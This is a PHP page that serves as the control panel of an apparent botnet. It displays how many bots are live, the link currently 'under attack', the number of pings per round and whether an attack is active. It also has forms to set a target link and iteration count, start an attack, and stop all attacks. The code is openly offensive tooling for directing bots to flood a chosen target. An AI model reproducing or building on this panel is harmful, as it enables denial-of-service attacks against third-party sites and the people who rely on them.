<?php
    require_once 'functions.php';
    
    $liveBots = getLiveBots();
?>

<center>
    <h1>Control Your Bots</h1>
</center>

<center>
    <?php echo '<span style="color:red; font-size: 50px">'.sizeof($liveBots).'</span>' . "bots are live" ?>
</center>

<center>
<table border="1">
    <tr>
        <td><?php echo "<span style='color:blue; font-size: 20px'> ".getLinkValue()." </span> is under attack"; ?></td>
        <td><?php echo "<span style='color:brown; font-size: 20px'> ".getIterValue()." </span> pings in a go"; ?></td>
        <td><?php echo getAttackValue() == '1' ? '<span style="color:green; font-size: 20px">ACTIVE</span>' : '<span style="color:red; font-size: 20px">NOT ACTIVE</span>'; ?></td>
    </tr>
</table>
</center>

<br><br><br>
<center>
<form action="saveAttackData.php" method="post">
    <table>
        <th>Please fill following data</th>
        <tr>
            <td>Set link To attack</td>
            <td><input type="text" name="link"></td>
        </tr>
        <tr>
            <td>Iteration Per Attack</td>
            <td><input type="text" name="iter"></td>
        </tr>
        <tr></tr>
        <tr>
            <td></td>
            <td><input type="submit" value="Start Attack"></td>
        </tr>
    </table>
</form>
</center>

<br><br><br>
<center>
<form action="stopAttack.php" method="post">
    <input type="submit" value="Stop All Attacks">
</form>
</center>